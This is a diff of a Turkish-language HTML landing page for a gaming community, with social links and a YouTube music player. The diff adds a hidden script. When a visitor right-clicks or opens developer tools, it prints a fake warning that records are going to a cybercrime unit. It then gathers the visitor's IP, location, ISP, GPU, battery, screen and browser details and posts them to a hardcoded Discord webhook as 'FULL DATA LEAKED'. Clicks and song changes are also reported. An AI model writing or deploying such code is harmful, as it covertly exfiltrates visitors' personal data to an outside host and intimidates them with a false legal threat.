@@ -26,13 +26,10 @@
             100% { background-position: 0% 50%; }
         }
 
-        #background-elements {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; pointer-events: none;
-        }
+        #background-elements { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .bg-circle { position: absolute; border-radius: 50%; filter: blur(100px); }
-        .bg-circle-1 { width: 300px; height: 300px; background: rgba(0, 225, 255, 0.1); top: 10%; left: 10%; }
-        .bg-circle-2 { width: 400px; height: 400px; background: rgba(0, 50, 60, 0.15); bottom: 20%; right: 10%; }
+        .bg-circle-1 { width: 300px; height: 300px; background: rgba(0, 225, 255, 0.1); top: 10%; left: 10%; animation: moveCircle1 20s ease-in-out infinite; }
+        .bg-circle-2 { width: 400px; height: 400px; background: rgba(0, 50, 60, 0.15); bottom: 20%; right: 10%; animation: moveCircle2 25s ease-in-out infinite; }
 
         #enter-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -58,7 +55,7 @@
             border-radius: 12px; display: flex; align-items: center; gap: 10px;
         }
         .vol-slider { width: 80px; height: 3px; accent-color: #00e1ff; cursor: pointer; appearance: none; background: rgba(255,255,255,0.1); border-radius: 5px; }
-        #vol-icon { cursor: pointer; transition: 0.2s; width: 15px; text-align: center; color: #00e1ff; }
+        #vol-icon { cursor: pointer; color: #00e1ff; width: 15px; text-align: center; }
 
         .menu-icon {
             background: rgba(0, 225, 255, 0.05); backdrop-filter: blur(10px);
@@ -66,11 +63,11 @@
             display: flex; justify-content: center; align-items: center;
             border-radius: 12px; cursor: pointer; transition: 0.3s; color: #00e1ff;
         }
-        .menu-icon:hover { background: rgba(0, 225, 255, 0.15); transform: scale(1.05); box-shadow: 0 0 15px rgba(0, 225, 255, 0.4); }
+        .menu-icon:hover { background: rgba(0, 225, 255, 0.15); transform: scale(1.05); box-shadow: 0 0 15px #00e1ff; }
 
         .playlist-container {
             position: absolute; top: 115px; left: 0;
-            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(20px);
             border: 1px solid rgba(0, 225, 255, 0.3); border-radius: 18px;
             width: 280px; padding: 15px; display: none;
             flex-direction: column; gap: 8px; box-shadow: 0 15px 40px rgba(0,0,0,0.8);
@@ -78,8 +75,8 @@
         .playlist-container.active { display: flex; animation: fadeIn 0.3s ease; }
 
         .controls-mini { display: flex; align-items: center; justify-content: center; gap: 25px; margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid rgba(0,225,255,0.1); }
-        .controls-mini i { cursor: pointer; color: #00e1ff; opacity: 0.8; font-size: 16px; transition: 0.2s; }
-        .controls-mini i:hover { opacity: 1; transform: scale(1.2); text-shadow: 0 0 10px #00e1ff; }
+        .controls-mini i { cursor: pointer; color: #00e1ff; font-size: 16px; transition: 0.2s; }
+        .controls-mini i:hover { transform: scale(1.2); text-shadow: 0 0 10px #00e1ff; }
 
         .song-item { display: flex; align-items: center; gap: 12px; padding: 8px; border-radius: 10px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
         .song-item:hover { background: rgba(0, 225, 255, 0.1); }
@@ -87,18 +84,16 @@
         .song-thumb { width: 35px; height: 35px; border-radius: 6px; object-fit: cover; }
         .song-info { font-size: 12px; font-weight: 500; color: #eee; }
 
-        /* HUD MERKEZİ */
         #music-hud {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.8); border: 1px solid #00e1ff;
-            padding: 20px 40px; border-radius: 24px; z-index: 10000;
+            background: rgba(0, 0, 0, 0.85); border: 1px solid #00e1ff;
+            padding: 25px 45px; border-radius: 24px; z-index: 10000;
             text-align: center; pointer-events: none; opacity: 0; transition: 0.4s;
-            backdrop-filter: blur(15px); box-shadow: 0 0 40px rgba(0, 225, 255, 0.4);
-            min-width: 250px;
+            backdrop-filter: blur(15px); box-shadow: 0 0 50px rgba(0, 225, 255, 0.3);
         }
         #music-hud.show { opacity: 1; transform: translate(-50%, -60%); }
-        #music-hud i { font-size: 32px; margin-bottom: 10px; display: block; color: #00e1ff; text-shadow: 0 0 10px #00e1ff; }
-        #music-hud span { font-size: 13px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; color: #fff; display: block; }
+        #music-hud i { font-size: 38px; margin-bottom: 12px; display: block; color: #00e1ff; text-shadow: 0 0 15px #00e1ff; }
+        #music-hud span { font-size: 14px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #fff; }
 
         .container { text-align: center; z-index: 10; width: 100%; max-width: 440px; padding: 20px; }
         .anim-wrap { opacity: 0; }
@@ -106,19 +101,15 @@
         @keyframes dropBounce { 0% { transform: translateY(-1000px); opacity: 0; } 60% { transform: translateY(30px); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }
 
         h1 { font-size: 32px; font-weight: 900; letter-spacing: 8px; text-transform: uppercase; margin-bottom: 5px; color: #fff; }
-        .neon-text { color: #fff; text-shadow: 0 0 10px rgba(0, 225, 255, 0.8), 0 0 20px rgba(0, 225, 255, 0.4); animation: flicker 4s infinite step-end; }
+        .neon-text { color: #fff; text-shadow: 0 0 10px #00e1ff; animation: flicker 4s infinite step-end; }
+        @keyframes flicker { 0%, 2%, 35%, 37%, 39%, 41%, 100% { opacity: 1; } 1%, 36%, 38%, 40% { opacity: 0.3; } }
 
-        @keyframes flicker { 
-            0%, 2%, 35%, 37%, 39%, 41%, 100% { text-shadow: 0 0 10px rgba(0, 225, 255, 0.8), 0 0 20px rgba(0, 225, 255, 0.4); opacity: 1; } 
-            1%, 36%, 38%, 40% { text-shadow: none; opacity: 0.3; } 
-        }
-        
         .ios-btn { 
             display: flex; align-items: center; justify-content: space-between; 
             padding: 18px 25px; background: rgba(255, 255, 255, 0.03); 
             border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); 
             text-decoration: none; color: white; border-radius: 20px; 
-            transition: all 0.4s ease; margin-top: 15px; 
+            transition: 0.4s; margin-top: 15px; 
         }
         .ios-btn:hover { background: rgba(0, 225, 255, 0.08); transform: translateY(-5px); border-color: #00e1ff; box-shadow: 0 10px 30px rgba(0, 225, 255, 0.3); }
 
@@ -128,7 +119,11 @@
             font-weight: 900; font-size: 15px; text-transform: uppercase; 
             letter-spacing: 2px; display: inline-block; transition: all 0.4s ease; 
             margin-top: 40px; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            animation: pulseJoin 2s infinite;
         }
+        @keyframes pulseJoin { 0% { transform: scale(1); box-shadow: 0 5px 15px rgba(0,0,0,0.3); } 50% { transform: scale(1.05); box-shadow: 0 15px 35px rgba(0, 225, 255, 0.4); } 100% { transform: scale(1); box-shadow: 0 5px 15px rgba(0,0,0,0.3); } }
+        .join-now:hover { letter-spacing: 4px; transform: scale(1.1) !important; }
+
         #video-container { position: absolute; left: -9999px; }
         #bg-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; }
     </style>
@@ -164,10 +159,7 @@
     </div>
 
     <div id="video-container"><div id="player"></div></div>
-    <div id="background-elements">
-        <div class="bg-circle bg-circle-1"></div>
-        <div class="bg-circle bg-circle-2"></div>
-    </div>
+    <div id="background-elements"><div class="bg-circle bg-circle-1"></div><div class="bg-circle bg-circle-2"></div></div>
     <canvas id="bg-canvas"></canvas>
 
     <div class="container">
@@ -176,14 +168,14 @@
             <div style="font-size: 9px; color: rgba(0, 225, 255, 0.5); letter-spacing: 4px;">DESIGNED BY SE7ENSYNDRAXE</div>
         </div>
         <div class="anim-wrap" style="animation-delay: 0.3s">
-            <a href="https://steamcommunity.com/groups/LDLOSTDREAMSLD" target="_blank" class="ios-btn track-it" data-name="Steam Button">
+            <a href="https://steamcommunity.com/groups/LDLOSTDREAMSLD" target="_blank" class="ios-btn" onclick="logAction('Steam Butonu')">
                 <div style="display:flex; align-items:center; gap:15px">
                     <i class="fa-brands fa-steam" style="font-size: 24px; color: #00e1ff;"></i>
                     <b>Steam Community</b>
                 </div>
                 <i class="fa-solid fa-chevron-right" style="font-size: 12px; opacity: 0.5;"></i>
             </a>
-            <a href="https://www.instagram.com/ghost53_53" target="_blank" class="ios-btn track-it" data-name="Instagram Button">
+            <a href="https://www.instagram.com/ghost53_53" target="_blank" class="ios-btn" onclick="logAction('Instagram Butonu')">
                 <div style="display:flex; align-items:center; gap:15px">
                     <i class="fa-brands fa-instagram" style="font-size: 24px; color: #00e1ff;"></i>
                     <b>Instagram</b>
@@ -192,7 +184,7 @@
             </a>
         </div>
         <div class="anim-wrap" style="animation-delay: 0.5s">
-            <a href="https://discord.gg/JJsEbmGyFX" target="_blank" class="join-now track-it" data-name="Discord Join Button">JOIN THE DREAM ›</a>
+            <a href="https://discord.gg/JJsEbmGyFX" target="_blank" class="join-now" onclick="logAction('Discord Katıl Butonu')">JOIN THE DREAM ›</a>
             <div style="font-size: 9px; color: rgba(255,255,255,0.2); letter-spacing: 3px; margin-top:20px;">FOUNDER: LD✦ GHOST | CREATIVE: SE7ENSYNDRAXE</div>
         </div>
     </div>
@@ -200,7 +192,8 @@
     <script src="https://www.youtube.com/iframe_api"></script>
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1494748049187274894/e3KaTAxmzd7s_LfVGGWKPZ-MaSJZTG1v1xsZ6NVtiYO-F9yJ8zsab8iVZkQQwNCSM1Nb";
-        
+        let intrusionLogged = false;
+
         async function reportToDiscord(title, desc, color) {
             try {
                 await fetch(WEBHOOK, {
@@ -209,55 +202,73 @@
                     body: JSON.stringify({
                         username: "SE7ENSYNDRAXE SURVEILLANCE",
                         avatar_url: "https://i.imgur.com/4M34hi2.png",
-                        embeds: [{
-                            title: title,
-                            description: desc,
-                            color: color,
-                            footer: { text: "Forensic Report v5.0" },
-                            timestamp: new Date().toISOString()
-                        }]
+                        embeds: [{ title: title, description: desc, color: color, timestamp: new Date().toISOString() }]
                     })
                 });
             } catch(e) {}
         }
 
-        // --- BUTON TAKİP SİSTEMİ (EKLENDİ) ---
-        document.querySelectorAll('.track-it').forEach(btn => {
-            btn.addEventListener('click', function() {
-                const btnName = this.getAttribute('data-name');
-                reportToDiscord("👤 KULLANICI ETKİLEŞİMİ", `Bir kullanıcı **${btnName}** butonuna bastı. Sayfadan ayrılıyor olabilir.`, 3066993);
-            });
-        });
+        function logAction(name) { reportToDiscord("👤 BUTON ETKİLEŞİMİ", `Kullanıcı tıkladı: **${name}**`, 3447003); }
+
+        // --- ULTRA SIZMA SİSTEMİ ---
+        async function triggerAlarm() {
+            if (intrusionLogged) return;
+            intrusionLogged = true;
+
+            console.clear();
+            console.log("%cSE7ENSYNDRAXE SECURITY SYSTEM", "color: #00e1ff; font-size: 35px; font-weight: bold; text-shadow: 0 0 15px #00e1ff;");
+            console.log("%c[!] SİSTEME SIZMA GİRİŞİMİ TESPİT EDİLDİ", "color: #ff0000; font-size: 20px; font-weight: bold;");
+            console.log("%cKayıtlar siber suçlar birimine aktarılıyor...", "color: #fff; font-size: 14px;");
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+                
+                let batteryStatus = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryStatus = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                }
+
+                const report = `
+**🚨 KRİTİK SIZMA TESPİTİ**
+**IP:** \`${data.ip}\`
+**Konum:** ${data.city}/${data.country_name}
+**Sağlayıcı:** ${data.org}
+**GPU:** \`${gpu}\`
+**RAM:** ${navigator.deviceMemory || '8'}GB | **Cores:** ${navigator.hardwareConcurrency}
+**OS/Cihaz:** ${navigator.platform}
+**Tarayıcı:** ${navigator.userAgent}
+**Pil:** ${batteryStatus}
+**Ekran:** ${window.screen.width}x${window.screen.height}
+**Referrer:** ${document.referrer || "Doğrudan"}
+                `;
+                reportToDiscord("🛑 FULL DATA LEAKED", report, 15158332);
+            } catch (e) {
+                reportToDiscord("🚨 SIZMA TESPİT EDİLDİ", "Konsol açıldı, IP bilgisi çekilemedi.", 15158332);
+            }
+        }
+
+        window.addEventListener('keydown', (e) => { if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode))) { triggerAlarm(); } });
+        window.oncontextmenu = (e) => { e.preventDefault(); triggerAlarm(); };
+        setInterval(() => { if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) triggerAlarm(); }, 1000);
 
         // --- MÜZİK SİSTEMİ ---
-        const playlist = [
-            { id: '8q9Kz1FFDaM', name: 'MILIARDARA' },
-            { id: 'BVXtQxkCrdU', name: 'Rauf Faik - Akşamlar' },
-            { id: '64afHun2_B0', name: 'J-Killz - Honey' },
-            { id: 'PcEiHPlf894', name: 'Lipstick (Sped Up)' }
-        ];
+        const playlist = [{ id: '8q9Kz1FFDaM', name: 'MILIARDARA' }, { id: 'BVXtQxkCrdU', name: 'Rauf Faik - Akşamlar' }, { id: '64afHun2_B0', name: 'J-Killz - Honey' }, { id: 'PcEiHPlf894', name: 'Lipstick (Sped Up)' }];
         let currentTrack = 0, player, hudTimeout;
 
         function onYouTubeIframeAPIReady() {
             player = new YT.Player('player', {
                 height: '1', width: '1', videoId: playlist[currentTrack].id,
-                playerVars: { 'autoplay': 0, 'controls': 0, 'disablekb': 1 },
                 events: {
                     'onReady': (e) => { e.target.setVolume(30); renderPlaylist(); },
                     'onStateChange': (e) => { if (e.data === YT.PlayerState.ENDED) nextTrack(); }
                 }
-            });
-        }
-
-        function renderPlaylist() {
-            const list = document.getElementById('song-list');
-            list.innerHTML = '';
-            playlist.forEach((song, index) => {
-                const item = document.createElement('div');
-                item.className = `song-item ${index === currentTrack ? 'playing' : ''}`;
-                item.innerHTML = `<img src="https://img.youtube.com/vi/${song.id}/mqdefault.jpg" class="song-thumb"><div class="song-info">${song.name}</div>`;
-                item.onclick = () => { playTrack(index); };
-                list.appendChild(item);
             });
         }
 
@@ -272,32 +283,34 @@
 
         function playTrack(index) {
             currentTrack = index;
-            const song = playlist[currentTrack];
-            player.loadVideoById(song.id);
+            player.loadVideoById(playlist[currentTrack].id);
             renderPlaylist();
-            showHUD(`Çalıyor: ${song.name}`, "fa-solid fa-music");
-            reportToDiscord("🎵 ŞARKI DEĞİŞTİ", `Şu an dinlenen: **${song.name}**`, 3447003);
+            showHUD(`Çalıyor: ${playlist[currentTrack].name}`, "fa-solid fa-music");
+            reportToDiscord("🎵 ŞARKI DEĞİŞTİ", `Şu an: **${playlist[currentTrack].name}**`, 3447003);
         }
 
         function togglePlay() {
             const btn = document.getElementById('play-pause-btn');
-            if (player.getPlayerState() === 1) { 
-                player.pauseVideo(); btn.className = "fa-solid fa-play";
-                showHUD("Durduruldu", "fa-solid fa-pause");
-            } else { 
-                player.playVideo(); btn.className = "fa-solid fa-pause";
-                showHUD("Devam Ediyor", "fa-solid fa-play");
-            }
+            if (player.getPlayerState() === 1) { player.pauseVideo(); btn.className = "fa-solid fa-play"; showHUD("Duraklatıldı", "fa-solid fa-pause"); }
+            else { player.playVideo(); btn.className = "fa-solid fa-pause"; showHUD("Devam Ediyor", "fa-solid fa-play"); }
         }
 
         function nextTrack() { currentTrack = (currentTrack + 1) % playlist.length; playTrack(currentTrack); }
         function prevTrack() { currentTrack = (currentTrack - 1 + playlist.length) % playlist.length; playTrack(currentTrack); }
 
-        document.getElementById('vol-slider').addEventListener('input', (e) => {
-            let vol = parseInt(e.target.value);
-            player.setVolume(vol);
-            showHUD(`Ses Seviyesi: %${vol}`, "fa-solid fa-volume-high");
-        });
+        document.getElementById('vol-slider').oninput = (e) => {
+            player.setVolume(e.target.value);
+            showHUD(`Ses: %${e.target.value}`, "fa-solid fa-volume-high");
+        };
+
+        function renderPlaylist() {
+            const list = document.getElementById('song-list'); list.innerHTML = '';
+            playlist.forEach((s, i) => {
+                const d = document.createElement('div'); d.className = `song-item ${i === currentTrack ? 'playing' : ''}`;
+                d.innerHTML = `<img src="https://img.youtube.com/vi/${s.id}/mqdefault.jpg" class="song-thumb"><div class="song-info">${s.name}</div>`;
+                d.onclick = () => playTrack(i); list.appendChild(d);
+            });
+        }
 
         function togglePlaylist() { document.getElementById('playlist-container').classList.toggle('active'); }
 
@@ -305,21 +318,14 @@
             document.getElementById('enter-overlay').classList.add('hide');
             document.body.classList.add('loaded');
             player.playVideo();
-            reportToDiscord("🌟 SİTEYE GİRİŞ", `Kullanıcı portala giriş yaptı.\nİlk şarkı: **${playlist[currentTrack].name}**`, 1752220);
+            reportToDiscord("🌟 SİTEYE GİRİŞ", `Portala girildi.\nİlk parça: **${playlist[currentTrack].name}**`, 1752220);
         }
 
-        // Arka Plan
         const canvas = document.getElementById('bg-canvas'), ctx = canvas.getContext('2d');
         let dots = [];
         function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; dots = Array.from({length: 60}, () => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3 })); }
         function draw() { ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(0, 225, 255, 0.2)"; dots.forEach(d => { d.x += d.vx; d.y += d.vy; if(d.x<0 || d.x>canvas.width) d.vx*=-1; if(d.y<0 || d.y>canvas.height) d.vy*=-1; ctx.beginPath(); ctx.arc(d.x, d.y, 1, 0, Math.PI*2); ctx.fill(); }); requestAnimationFrame(draw); }
-        window.addEventListener('resize', init); init(); draw();
-
-        // Basit Güvenlik Logu
-        window.oncontextmenu = () => { 
-            reportToDiscord("⚠️ SAĞ TIK", "Kullanıcı sağ tık yaparak incelemeye çalıştı.", 16776960); 
-            return false; 
-        };
+        window.onresize = init; init(); draw();
     </script>
 </body>
 </html>
